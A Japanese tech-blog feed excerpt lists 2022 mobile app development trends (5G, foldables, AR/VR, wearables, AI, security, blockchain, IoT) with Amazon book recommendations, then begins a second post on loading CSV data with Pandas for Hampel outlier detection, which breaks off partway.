&lt;p>5Gテクノロジーは数年前から存在していますが、近年より注目されるうようになりました。テクノロジー企業は5Gを本格的に取り入れ始めており、5G対応デバイスが市場に出回っています。来年までに、6億6000万台のスマートフォンが5G接続になると予想されており、これは全デバイスの約47.5％を占めています。 世界中の5G接続が今後数年間でどのように成長すると予測されているかを見てみましょう。&lt;/p>
&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 127;
flex-basis: 305px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-01-17-01-wyoshi/rise-of-5g.jpg" data-size="980x769">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-01-17-01-wyoshi/rise-of-5g.jpg"
width="980"
height="769"
loading="lazy"
alt="rise of 5g"
>
&lt;/a>
&lt;/a>
&lt;figcaption>rise of 5g&lt;/figcaption>
&lt;/figure>&lt;/p>
&lt;h3 id="5gの出現でアプリ開発はどうなる">5Gの出現でアプリ開発はどうなる？&lt;/h3>
&lt;p>5Gは、アプリの構築と使用の方法を変え、速度と効率が大幅に向上します。&lt;br>
それにより期待できることがいくつかあります。&lt;/p>
&lt;ul>
&lt;li>5Gは4Gよりも最大100倍高速になります。&lt;/li>
&lt;li>レイテンシーは50ミリ秒（4G）から1ミリ秒に短縮されます。&lt;/li>
&lt;li>高解像度、低遅延、高速性能により、ビデオストリーミングアプリケーションは大幅に改善されるだろう。&lt;/li>
&lt;li>5Gでは、これらの技術をアプリに統合することが容易になるため、ARやVRの機会が増えるだろう。&lt;/li>
&lt;li>デバイスとスマートフォン間でのデータ転送がより高速かつスムーズになります。&lt;/li>
&lt;li>5Gを使用すると、開発者はアプリのパフォーマンスに悪影響を与えることなく新しい機能を構築できます&lt;/li>
&lt;li>識別のための生体認証データの処理が高速化されているため、モバイル決済はより迅速かつ安全になります。&lt;/li>
&lt;/ul>
&lt;p>全体として、5Gテクノロジーはアプリをより速く、よりスムーズに、より効率的にすることができます。また、イノベーションの余地も広がります。アプリに関するワクワクするようなアイデアは、もはやアイデアにとどまることはありません。5Gを使えば、それらを実現することができます。5Gが何をもたらすのか、今から楽しみです。&lt;/p>
&lt;h2 id="折りたたみ式デバイス用アプリ">折りたたみ式デバイス用アプリ&lt;/h2>
&lt;p>折りたたみ式端末はスマートフォン市場全体のシェアの先端ですが、今後数年で状況が変わってきます。&lt;a class="link" href="https://www.statista.com/statistics/983531/global-foldable-phone-shipments/" target="_blank" rel="noopener"
>統計局&lt;/a> によると、2022年には5,000万台が出荷されるとのことです。つまりモバイルアプリの開発戦略を練る際には、折りたたみ式デバイスも念頭に置くべきでしょう。2022年のモバイルアプリ開発のトレンドである折りたたみ式デバイスで、あなたのアプリがシームレスに動作することを確認してください。&lt;/p>
&lt;p>端末を折りたたんで大きな画面を提供することは、ユーザーにいい影響を与えます。&lt;/p>
&lt;ul>
&lt;li>大きな画面は、詳細で没入感のある体験を提供するためのスペースを意味します。&lt;/li>
&lt;li>マルチウィンドウにより、ユーザーは複数のタスクを同時に実行することができます。&lt;/li>
&lt;/ul>
&lt;p>ビデオストリーミングやゲームアプリは、画面サイズを大きくするだけで、折りたたみ式デバイスから最大限の利益を得ることができ、余分なスペースを使って追加の情報やコントロールを提供することもできます。このように、画面を意識したアプリの開発は、2022年のモバイルアプリ開発における最大のトレンドの1つとなるでしょう。&lt;/p>
&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 165;
flex-basis: 397px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-01-17-01-wyoshi/video-streaming.jpg" data-size="980x591">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-01-17-01-wyoshi/video-streaming.jpg"
width="980"
height="591"
loading="lazy"
alt="ストリーミング"
>
&lt;/a>
&lt;/a>
&lt;figcaption>ストリーミング&lt;/figcaption>
&lt;/figure>&lt;/p>
&lt;h2 id="arvr">AR＆VR&lt;/h2>
&lt;p>ポケモンGOの成功は一時的なものだったかもしれませんが、モバイルアプリ開発におけるARの道を切り開いたと言えるでしょう。それは、VRを使ってユーザーに没入型の体験を提供することが現実的に可能であることを世界に示したのです。&lt;/p>
&lt;p>今日、周りを見渡せば、ブランドがユーザー体験を高めるためにAR＆VRを活用しているシーンは数多く見受けられます。&lt;/p>
&lt;ul>
&lt;li>IKEAはARを使用して、ユーザーが購入する前に自宅で家具がどのように見えるかを確認できるようにします。&lt;/li>
&lt;li>L&amp;rsquo;Orealは、ユーザーが自分の顔に化粧をしたときの見え方を確認できるバーチャルメイクアップアプリを提供しています。&lt;/li>
&lt;li>Lenskartは、ユーザーがメガネを買う前にバーチャルで試せるようにしています。&lt;/li>
&lt;/ul>
&lt;p>Apple、Google、Metaでさえも、AR &amp;amp; VRにイノベーションをもたらしています。グーグルはグーグルマップに「ライブビュー」という機能を導入し、ユーザーは現実の画像上でリアルタイムに方角を確認することができるようになりました。&lt;br>
LiDARもまた、最近ARの分野で見られた重要な技術的進歩です。Appleによって光の速度のARと呼ばれる - 私たちは、この技術がiPad Pro、iPhone 12 Pro、iPhone Pro 12 Pro maxでデビューするのを目にしました。それは、ARをまったく新しいレベルに引き上げました。LiDARにより、低照度下でも優れた品質の写真を撮影することが可能になりました。&lt;/p>
&lt;p>AppleはIkeaと提携し、LiDAR技術を利用した新しいスタジオモード機能を開始し、家具の買い方にまで革命を起こしています。この機能を使うと、ユーザーは家具を置きたい場所にデバイスを向けると、LiDARテクノロジーが部屋をスキャンして、実物大の家具モデルをバーチャルに配置することができます。&lt;/p>
&lt;p>今年は、ARとVRが、私たちの想像を絶する方法でモバイルアプリ開発業界を形成することが予想されます。モバイルアプリのトレンドは、より主流になるでしょう。統計局によると、ARとVR技術の世界市場は、2018年の270億ドルから2022年には約2,090億ドルに上昇すると言われています。&lt;/p>
&lt;p>また、今年はAR＆VRのユーザー数が急増することが予想されます。このようなモバイルアプリの開発トレンドを活用して、モバイルでユーザーにゲームを変えるような体験を提供する絶好のチャンスがあるということです。&lt;/p>
&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 121;
flex-basis: 291px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-01-17-01-wyoshi/ar-and-vr.jpg" data-size="980x808">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-01-17-01-wyoshi/ar-and-vr.jpg"
width="980"
height="808"
loading="lazy"
alt="ar and vr"
>
&lt;/a>
&lt;/a>
&lt;figcaption>ar and vr&lt;/figcaption>
&lt;/figure>&lt;/p>
&lt;h2 id="ウェアラブルアプリの統合">ウェアラブルアプリの統合&lt;/h2>
&lt;p>ウェアラブルデバイスがすでに世界を席巻しています。&lt;br>
&lt;a class="link" href="https://www.statista.com/statistics/487291/global-connected-wearable-devices/" target="_blank" rel="noopener"
>統計局&lt;/a> によると、接続されたウェアラブルデバイスは2017年に4億5300万に達し、2022年までに9億2900万に達するでしょう。&lt;br>
今年は、ウェアラブルデバイス業界で多くの重要なことが起こっているのを見ました。&lt;br>
アップルはWatchOS 8アップデートを発表しました。これは、アップルウォッチユーザーに新機能、新鮮なウォッチフェイス、ウォレットへのアクセスの増加、インターフェイスの再設計をもたらしました。&lt;br>
Googleも、同社のウェアOSとSamsungのTizenソフトウェア・プラットフォームを融合した統一ウェアラブル・プラットフォームを発表し、アプリの起動時間を30％向上させました。&lt;br>
これは、2022年のモバイルアプリ開発の必須トレンドの1つであるウェアラブルテクノロジーの台頭を意味するものです。&lt;br>
つまり、アプリ開発者や企業は、スマートウォッチやウェアラブルでユーザーに優れたデジタル体験を提供するアプリを準備し、そうでない企業に対して明確な優位性を獲得する必要があるのです。&lt;br>
このモバイルアプリ開発のトレンドを取り入れ、シームレスなデジタル体験を提供することで、ターゲットとなる顧客との距離を縮めましょう。&lt;/p>
&lt;h2 id="食品食料品の配達アプリ">食品・食料品の配達アプリ&lt;/h2>
&lt;p>人々はロックダウン後、在宅時間が多くなるため、食料品の即日配達サービスやミールキットなどのアプリに大きく依存するようになり、この2つは2020年から21年にかけて最も成長したアプリのカテゴリーとなりました。&lt;/p>
&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 121;
flex-basis: 292px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-01-17-01-wyoshi/food-grocery-delivery-apps.jpg" data-size="980x804">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-01-17-01-wyoshi/food-grocery-delivery-apps.jpg"
width="980"
height="804"
loading="lazy"
alt="food grocery delivery apps"
>
&lt;/a>
&lt;/a>
&lt;figcaption>food grocery delivery apps&lt;/figcaption>
&lt;/figure>&lt;/p>
&lt;p>ご覧の通り、2020年には食料品アプリの利用者が40.9％増加しました。ほとんどの人が、食料品の買い物は実店舗に行かず、オンラインで行うことを選んだのです。&lt;/p>
&lt;p>同様のことは、フードデリバリーアプリでも起こりました。安全性が高く、オンラインで食品を注文することを好む人が多いため、32.9％の上昇となりました。&lt;/p>
&lt;p>しかし、2021年にはどちらのアプリも人気が低下しています。食料品アプリが5.8％上昇したのに対し、フードデリバリーアプリの利用者は2.6％減少しました。&lt;/p>
&lt;p>通常の生活に戻れば、その成長も少し低下するかもしれません。食品・食料品アプリは、依然として私たちの生活の重要な一部となるでしょう。人々はオンラインで食べ物を注文することをやめることはないでしょうし、食料品アプリはスマートフォンユーザーの15.5%を占めることに変わりはないでしょう。&lt;/p>
&lt;p>いずれにせよ、時間が経てばわかることですが、2022年に食品・食料品配達アプリがどのような道を歩むのか、興味深いところです。&lt;/p>
&lt;h2 id="モバイルエンターテインメントゲーム">モバイルエンターテインメント＆ゲーム&lt;/h2>
&lt;p>エンターテイメントやゲームアプリは、今やライフスタイルの一部となりました。それ無しでは一日たりとも過ごせないという人もいるほどです。&lt;/p>
&lt;p>Netflixの米国とカナダでのアクティブな加入者が約74％であることから、モバイルエンターテイメントアプリの人気は推し量ることができます。それだけでなく、1億5910万人以上の携帯電話ユーザーがおり、モバイルデバイスはゲーマーに人気があり、米国のデジタルゲーマーの89%以上に相当します。&lt;/p>
&lt;p>この数字は、2022年にはさらに上昇することが予想されます。&lt;/p>
&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 127;
flex-basis: 305px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-01-17-01-wyoshi/mobile-entertainment.jpg" data-size="980x770">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-01-17-01-wyoshi/mobile-entertainment.jpg"
width="980"
height="770"
loading="lazy"
alt="mobile entertainment"
>
&lt;/a>
&lt;/a>
&lt;figcaption>mobile entertainment&lt;/figcaption>
&lt;/figure>&lt;/p>
&lt;h3 id="なぜモバイルエンターテインメントとゲームアプリが人気があるのか">なぜモバイルエンターテインメントとゲームアプリが人気があるのか？&lt;/h3>
&lt;ul>
&lt;li>エンターテインメントを手軽に楽しめるようになった。&lt;br>
高価なガジェットや高価なノートパソコンを買う必要はなく、モバイルで楽しむことができる。&lt;/li>
&lt;li>映画を見たり、ゲームをしたりするために、1つの場所に閉じこもる必要がない。外出先でも楽しむことができる。&lt;/li>
&lt;li>AR、VR、人工知能などの技術の進歩により、ゲームやエンターテインメントアプリは、より没入感のあるもの。&lt;/li>
&lt;li>モバイルエンターテインメント＆ゲームアプリは非日常を提供する。&lt;/li>
&lt;/ul>
&lt;p>特にパンデミック時には、人々はゲームやエンターテインメントアプリに時間を費やし、気を紛らわせました。&lt;/p>
&lt;h2 id="aiと機械学習">AIと機械学習&lt;/h2>
&lt;p>FaceApp（自撮り写真を加工するアプリ）の画期的な成功の後、ほとんどの人が疑問に思っていました。次は何をするのだろう？そんな時、AIは期待をさらに大きく前進させるものをもたらしてくれました。MyHeritageAppは、写真をリアルなアニメーションに変換するすごい機能をもたらしたのです。このアニメーションはとても印象的で、愛する人があなたに微笑んでいるように感じられます。その結果、多くのリアクションが生まれました。&lt;/p>
&lt;p>昨年、AIで起こった興味深いことはこれだけではありません。Googleがマップアプリに、AIを使ってユーザー体験を向上させる新機能を投入したのも記憶に新しいです。そのひとつが、広い屋内空間でARナビゲーションを提供するライブビューです。&lt;br>
GoogleはAIを利用して、燃料消費量が少なくなるように道順を最適化し、二酸化炭素排出量の少ないルートを提案することも行っています。&lt;/p>
&lt;p>AIとMLは、ここ数年連続してモバイルアプリ開発のトップトレンドの1つとなっています。しかし、これらの技術の進歩は、2022年のモバイルアプリ開発のハードルを非常に高くしており、今年はそれが何をもたらすのか興味深いところです。&lt;/p>
&lt;p>機械学習もまた、革命的なことが起こるのが待ち望まれるエキサイティングな分野です。ディープラーニングが機械学習と手を組めば、貴重なデータとリアルタイムの分析を提供し、モバイルアプリ開発プロジェクトに素晴らしい効果をもたらすことができます。&lt;/p>
&lt;p>CAGR42％で成長する世界のML産業は、2019年の機械学習から2022年後半には約90億ドル規模になる見込みです。&lt;/p>
&lt;p>Appleは、機械学習における重要なプレイヤーの1つで、その優秀なMLモデルにより、開発者は没入感のある新しい体験を生み出すことができるようになりました。既存の機能を簡単に追加できるだけでなく、新しい機能を作ることもできます。その上、ML APIで新しい機能を追加することもできます。&lt;/p>
&lt;p>今年は、これらの技術に深く入り込み、その機能をきちんと理解し、多くの構成要素に触れることをお勧めします。&lt;/p>
&lt;h2 id="モバイルアプリのセキュリティがより重視">モバイルアプリのセキュリティがより重視&lt;/h2>
&lt;p>チェック・ポイントの「&lt;a class="link" href="https://www.checkpoint.com/press/2021/check-point-softwares-mobile-security-report-2021-shows-almost-every-organization-globally-experienced-a-mobile-malware-attack-during-the-past-year/" target="_blank" rel="noopener"
>State of Mobile Security 2021&lt;/a>」レポートによると、約46％の組織が、悪意のあるモバイル・アプリケーションをダウンロードした従業員を少なくとも1人抱えているとのことです。従業員のモバイル端末への依存度が高いことを考えると、企業にとって懸念すべき問題であると言えます。&lt;/p>
&lt;p>ほとんどの企業は、サイバーセキュリティがデータ保護や情報プライバシーに関する法律に直結していることを考慮して、サイバーセキュリティへの投資を増やそうとしています。&lt;/p>
&lt;p>このように、デジタルセキュリティは、2022年のモバイルアプリ開発のトップトレンドの1つとして浮上しています。業界の優れた頭脳は、モバイルアプリにまつわる不確実性を引き出すためにレベルアップしています。WWDC 2021で、Appleは &amp;ldquo;iCloud キーチェーン&amp;rdquo; という新機能を導入し、パスワードレスの未来への第一歩を踏み出しました。これによって、アップルはパスワードに代わって、より安全なログインプロセスを提供することになりました。&lt;/p>
&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 150;
flex-basis: 360px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-01-17-01-wyoshi/nobile-app-security.jpg" data-size="980x652">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-01-17-01-wyoshi/nobile-app-security.jpg"
width="980"
height="652"
loading="lazy"
alt="nobile app security"
>
&lt;/a>
&lt;/a>
&lt;figcaption>nobile app security&lt;/figcaption>
&lt;/figure>&lt;/p>
&lt;p>2022年、モバイルアプリ開発業界は、セキュリティファーストのアプローチにシフトし、強固なDevOps戦略のロードマップを構築すると予想されます。&lt;/p>
&lt;h2 id="スーパーアプリ">スーパーアプリ&lt;/h2>
&lt;p>1つのアプリに1つの目的 - これが、モバイルアプリ開発会社の長年のアプローチです。しかし今、そのアプローチは変わりつつあります。企業は、単一目的のアプリから、複数の目的を解決するワンストップ・ソリューションにシフトしているのです。&lt;/p>
&lt;p>このようなアプリはスーパーアプリと呼ばれ、アジアで絶大な人気を誇っています。しかし、このトレンドは欧米にも浸透しつつある。米国では、カリフォルニアに本社を置くブレインテクノロジーズ社が開発したNatural AIが面白い例として挙げられます。このアプリは、人々の携帯電話との付き合い方を変え、1つのアプリから複数の目的を解決できるようにすることを目指しています。&lt;/p>
&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 156;
flex-basis: 375px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-01-17-01-wyoshi/super-apps.jpg" data-size="980x627">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-01-17-01-wyoshi/super-apps.jpg"
width="980"
height="627"
loading="lazy"
alt="super apps"
>
&lt;/a>
&lt;/a>
&lt;figcaption>super apps&lt;/figcaption>
&lt;/figure>&lt;/p>
&lt;p>さらに、Facebookが単なるソーシャルメディアのプラットフォームからどのように拡張されたかをご覧になったことがあるかと思います。現在では、人々が製品を売買できるマーケットプレイスも提供されています。同様に、オンラインショッピングとは別に、請求書の支払いやAmazonからの支払いもできるようになりました。&lt;/p>
&lt;p>欧米では、スーパーアプリの流行はそれほど高くはなく、人々は1つに決める前にさまざまなソリューションを試すことを好むからです。それでも、最終的には誰もが利便性を求めるものです。スーパーアプリは、2022年に期待すべきモバイルアプリ開発のトレンドと言えるでしょう。&lt;/p>
&lt;h2 id="モバイルコマース">モバイルコマース&lt;/h2>
&lt;p>EEコマース分野は3兆5,600億ドル相当の売上を誇り、その72.9%はモバイルで発生しています。&lt;br>
つまり、モバイルコマースはアプリ開発のトレンドとして高まっているのです。&lt;/p>
&lt;p>COVIDの大流行後、ライフスタイルの大きな変化が見られました。大規模な小売業者から中小企業、個人消費者に至るまで、誰もがモバイルアプリに依存するようになったのです。&lt;/p>
&lt;p>そのため、適応できないEコマース企業は不利な状況に置かれています。彼らは多くの顧客を失い、彼らは変換することができるものを見逃しているもです。&lt;br>
つまり、企業は、このトレンドに適応し、電子商取引のビジネスアプリを持っている必要があります。それは、彼らがカットスロート競争を生き残ることができる唯一の方法です。&lt;/p>
&lt;h2 id="p2pモバイルアプリ">P2Pモバイルアプリ&lt;/h2>
&lt;p>P2Pモバイルアプリは、モバイルアプリ開発分野を特徴付けるもう一つの重要なトレンドです。eMarketerによると、P2Pモバイルトランザクションの予測価値は2023年までに6,122億3,000万ドルに達するでしょう。これは、現在、P2Pモバイルアプリに大きな可能性があることを意味します。&lt;/p>
&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 108;
flex-basis: 260px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-01-17-01-wyoshi/p2p-mobile-apps.jpg" data-size="980x903">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-01-17-01-wyoshi/p2p-mobile-apps.jpg"
width="980"
height="903"
loading="lazy"
alt="p2p mobile apps"
>
&lt;/a>
&lt;/a>
&lt;figcaption>p2p mobile apps&lt;/figcaption>
&lt;/figure>&lt;/p>
&lt;p>P2Pモバイルアプリが企業やユーザーの間で人気を集めている理由は、その利便性にある。ユーザーは素早く支払いができ、売り手は自分のアカウントに直接支払いを受けることができます。そのため、余計な手間がかかりません。&lt;br>
今年、私たちの周りで見られるP2Pモバイル・アプリの種類をいくつか紹介ましょう。&lt;/p>
&lt;ul>
&lt;li>決済機能を内蔵したソーシャルメディアプラットフォーム&lt;/li>
&lt;li>決済のためのシステムを組み込んだモバイルOSシステム。例：Apple Pay、Samsung Pay、Android Payなど。&lt;/li>
&lt;li>独自の決済システムを提供している独立系プロバイダー。&lt;/li>
&lt;li>銀行を決済の当事者とするP2Pアプリ。&lt;/li>
&lt;li>暗号通貨のウォレット。&lt;/li>
&lt;/ul>
&lt;p>P2Pモバイルアプリのアイデアがあるなら、それを実現する絶好の機会です。&lt;/p>
&lt;h2 id="ブロックチェーン">ブロックチェーン&lt;/h2>
&lt;p>私たちがブロックチェーンについて初めて耳にしたのは、暗号通貨ブームの時でした。しかし、今ではこの技術は大きく進歩し、さまざまな分野で応用できるようになりました。かなりの勢いで成長しており、2024年までに200億ドルの収益が蓄積されると予想されています。ブロックチェーンは、モバイルアプリ開発においても極めて重要な役割を担っています。&lt;/p>
&lt;p>分散型アプリは最近の流行りです。ブロックチェーンウォレットは7000万個以上あり、そのうちモバイルウォレットは最も好まれるブロックチェーンウォレットの形態です。これらの統計は、ブロックチェーンウォレットのユーザー数が大幅に増加していることも示しています。&lt;/p>
&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 123;
flex-basis: 295px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-01-17-01-wyoshi/blockchain.jpg" data-size="980x796">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-01-17-01-wyoshi/blockchain.jpg"
width="980"
height="796"
loading="lazy"
alt="blockchain"
>
&lt;/a>
&lt;/a>
&lt;figcaption>blockchain&lt;/figcaption>
&lt;/figure>&lt;/p>
&lt;p>そのほかに、デジタル資産の追跡、デジタルIDの保護、ロイヤルティプログラムの追跡にブロックチェーンを使用する通貨換算器も見られます。&lt;br>
2022年以降には、インテリジェント・コントラクト、著作権侵害防止ソフトウェア、選挙を穏健化するツール、Blockchain as a service（BaaS）プラットフォームなど、このトレンドがより主流になると見ています。特にモバイルコマースやモバイル決済アプリでは、ブロックチェーンを利用して不正を未然に防ぐことができるのです。&lt;/p>
&lt;h2 id="予測分析">予測分析&lt;/h2>
&lt;p>企業は以前からモバイルアプリで予測分析を利用しています。Netflixは、ユーザーの視聴習慣に基づいて映画やテレビ番組を推薦するためにこれを使用しています。また、Amazonは、予測分析を活用して、商品の推薦をパーソナライズしています。&lt;/p>
&lt;p>今年は、予測分析がより主流になると思われます。ここでは、2022年のモバイルアプリ開発において、このトレンドが重要な役割を果たすと考えられる2つの分野を紹介します。&lt;/p>
&lt;ul>
&lt;li>&lt;strong>開発プロセスの最適化へ&lt;/strong>&lt;br>
企業は、開発者から収集したデータを処理することで、問題を事前に発見し、より良い代替案を提案することができます。&lt;/li>
&lt;li>&lt;strong>ユーザーエクスペリエンスを向上させるために&lt;/strong>&lt;br>
企業はユーザーデータを利用して、ユーザーの行動を予測し、その旅をパーソナライズすることができます。&lt;/li>
&lt;/ul>
&lt;p>その結果、優れた品質を維持しながら開発期間を大幅に短縮し、イノベーションの実現により注力することが可能になったのです。&lt;/p>
&lt;h2 id="モバイル学習">モバイル学習&lt;/h2>
&lt;p>統計局によると、&lt;a class="link" href="https://www.statista.com/statistics/886092/use-of-mobile-learning-by-employees-worldwide/" target="_blank" rel="noopener"
>従業員の35％&lt;/a> がモバイルデバイスを頻繁に使って学習しているとのことです。また、モバイルラーニング市場は、2025年までに585億ドルに達し、2020年から2025年にかけて21.45%のCAGRが約束されると予想されています。つまり、モバイルラーニングは、モバイルアプリ開発のあり方を変える、有望なトレンドといえます。&lt;/p>
&lt;p>モバイルラーニングは多くの理由で有名です。まず、学習が簡単にアクセスできるようになります。学習者はどこでも、誰でも学習できるため、力を得たと感じられます。さらに、継続的なフィードバックや360度学習などの体験により、学習がインタラクティブで楽しいものになりました。&lt;/p>
&lt;p>コースの修了率の向上、学習の迅速化、エンゲージメントの向上、知識の定着率の向上につながるため、現在では企業でもモバイル学習が支持されています。&lt;br>
そのため、モバイル学習アプリの需要は高いといえます。画期的なアイデアや、社員教育のためにモバイル学習ソリューションを立ち上げる計画があるのなら、今こそ教育アプリ開発を専門とするチームにコンタクトを取るべきでしょう。&lt;/p>
&lt;h2 id="iot対応のモバイルアプリ">IoT対応のモバイルアプリ&lt;/h2>
&lt;p>インターネットは私たちの生活の中に深く入り込んでいます。スマートフォン、ノートパソコン、タブレットから、音声で操作できるスマートホームデバイスまで、私たちはインターネットに接続された機器に囲まれています。モノのインターネット（IoT）は、単なるトレンドにとどまらず、2022年の市場規模は5940億ドルと推定され、私たちの日常生活の一部となりました。&lt;/p>
&lt;p>ここ数年、アマゾンやグーグルのようなブランドがこの技術をフルに活用しているのを目にしました。彼らはそれぞれ「Echo」シリーズのデバイスとGoogle Home Voice Controllerを発表して、IoTの競争を強化しました。&lt;/p>
&lt;p>しかし現在では、Samsung、Xiaomi、Bosch、Honeywellなどのブランドも、モノのインターネット技術に急速に移行しています。小売業における継続的なサプライチェーン、スマートホーム、精通した健康保険プランなどは、もはやSF的なものではなく、現実に生きてきているのです。&lt;/p>
&lt;p>IoTガジェットやシステムの需要増加に伴い、IoT対応アプリの需要も同時に増加するため、2022年のモバイルアプリ開発のトップトレンドのリストに含まれています。&lt;/p>
&lt;h2 id="まとめ">まとめ&lt;/h2>
&lt;p>GoogleとAppleのApp Storeを合わせると663万個のアプリが存在します。あなたのアプリを目立たせるには、どうしたらいいでしょうか？&lt;/p>
&lt;p>実は、モバイルアプリ開発の最新トレンドを常に把握し、それを活用して堅牢で機能豊富なアプリを提供する方法を知らなければ、できないことなのです。&lt;/p>
&lt;p>モバイルアプリ業界は今後も急速に拡大し、モバイルアプリ開発の領域も進化していくでしょう。新興のモバイルアプリプラットフォーム開発技術、上昇するバックエンドプラットフォーム、マイクロサービス、そして新しいハードウェアの性能と相まって、モバイルアプリソリューションの舵取りを続けていくでしょう。継続的に学習し、常に意識することが、熾烈な競争を勝ち抜く唯一の方法なのです。&lt;/p>
&lt;h2 id="おすすめの書籍">おすすめの書籍&lt;/h2>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/NO-RULES-%e3%83%8e%e3%83%bc%e3%83%bb%e3%83%ab%e3%83%bc%e3%83%ab%e3%82%ba-%e4%b8%96%e7%95%8c%e4%b8%80%e3%80%8c%e8%87%aa%e7%94%b1%e3%80%8d%e3%81%aa%e4%bc%9a%e7%a4%be%e3%80%81NETFLIX-%e3%83%aa%e3%83%bc%e3%83%89%e3%83%bb%e3%83%98%e3%82%a4%e3%82%b9%e3%83%86%e3%82%a3%e3%83%b3%e3%82%b0%e3%82%b9/dp/4532323673/?tag=nlpqueens-22" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://images-fe.ssl-images-amazon.com/images/I/41dVKw11QRL.jpg" alt=" NO RULES(ノー・ルールズ) 世界一「自由」な会社、NETFLIX ">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name"> NO RULES(ノー・ルールズ) 世界一「自由」な会社、NETFLIX &lt;/h2>
&lt;p>5万部突破!! 日経朝刊で「経営者が読むべき1冊」と激賞! (2020年12月26日付) 「日本でこんなマネのできる企業はまずないだろうが、海外の競争相手はネットフリックス流の人材厳選主義を採用しているかもしれない。その迫力と怖さを知るためにも、経営者が手に取るべき本である」 ●Netflixはどうやって190カ国で2億人を獲得できたのか？。&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/%e3%82%aa%e3%83%bc%e3%83%89%e3%83%aa%e3%83%bc%e3%83%bb%e3%82%bf%e3%83%b3-%e3%83%87%e3%82%b8%e3%82%bf%e3%83%ab%e3%81%a8AI%e3%81%ae%e6%9c%aa%e6%9d%a5%e3%82%92%e8%aa%9e%e3%82%8b-ebook/dp/B08MF877HP/?tag=nlpqueens-22" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/51wkGUWGEIL.jpg" alt=" オードリー・タン デジタルとAIの未来を語る ">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name"> オードリー・タン デジタルとAIの未来を語る &lt;/h2>
&lt;p>オードリー・タン氏自身が、自らの考え、行動、夢を語る。 世界のメディアがいま、最も注目するテクノロジー界の叡智が、描くデジタルとAI（人工知能）の未来！ 台湾は、2020年に全世界を襲った新型コロナウイルス（COVID－19）の封じ込めに唯一成功しました。 本書は、その中心的な役割を担った若きデジタル担当政務委員（閣僚）が、コロナ対策成功の秘密、デジタルと民主主義、デジタルと教育、AIと社会・イノベーション、そして日本へのメッセージを、自身の言葉で語りつくします。&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside></description></item><item><title>s-Stat 時系列データで異常値を検知しよう（３）</title><link>https://suzukiiichiro.github.io/posts/2022-01-17-02-ani/</link><pubDate>Mon, 17 Jan 2022 17:46:13 +0900</pubDate><guid>https://suzukiiichiro.github.io/posts/2022-01-17-02-ani/</guid><description>&lt;img src="https://suzukiiichiro.github.io/posts/2022-01-17-02-ani/anal.jpg" alt="Featured image of post s-Stat 時系列データで異常値を検知しよう（３）" />&lt;h2 id="pandas-dataframeオブジェクト">Pandas DataFrameオブジェクト&lt;/h2>
&lt;p>Pandasでcsvをread_csvするとDataFrameオブジェクトとして読み込まれます。&lt;br>
DataFramオブジェクトは２次元配列な感じです。&lt;br>
１次元目が列、２次元目が行のイメージみたいです。&lt;/p>
&lt;p>例えば以下のcsvだと&lt;/p>
&lt;pre tabindex="0">&lt;code>date,value
2019,2845
2020,3246
2021,3633
&lt;/code>&lt;/pre>&lt;p>read_csvしたDataFrameオブジェクトの変数名をdfとすると&lt;br>
それぞれのデータには以下の方法でアクセスします。&lt;/p>
&lt;pre tabindex="0">&lt;code>df['date'][0]-&amp;gt;2019
df['date'][1]-&amp;gt;2020
df['date'][2]-&amp;gt;2021
df['value'][0]-&amp;gt;2845
df['value][1]-&amp;gt;3246
df['value'][2]-&amp;gt;3633
&lt;/code>&lt;/pre>&lt;p>read_csvするとデフォルトだと１行目を列名とみなすみたいです。&lt;br>
アクセスの方法も列名が反映され連想配列っぽくなります。&lt;/p>
&lt;h2 id="pandas-seriesオブジェクト">Pandas Seriesオブジェクト&lt;/h2>
&lt;p>hampelの第１引数はPandasのSeriesオブジェクトです。&lt;br>
Seriesオブジェクトは１次元の配列みたいです。&lt;br>
DataFrameオブジェクトからSeriesオブジェクトに変換する方法ですが&lt;br>
以下の方法でできます。&lt;/p>
&lt;pre tabindex="0">&lt;code>input=pd.Series(df['value'])
&lt;/code>&lt;/pre>&lt;h2 id="csvを読み込んでhampelメソッドを使い異常値を検出する-">csvを読み込んでhampelメソッドを使い異常値を検出する 。&lt;/h2>
&lt;p>プログラムは以下の流れになります。&lt;br>
csvをread_csvでDataFrameオブジェクトとして読み込む。&lt;br>
DataFrameオブジェクトからSeriesオブジェクトを生成する。&lt;br>
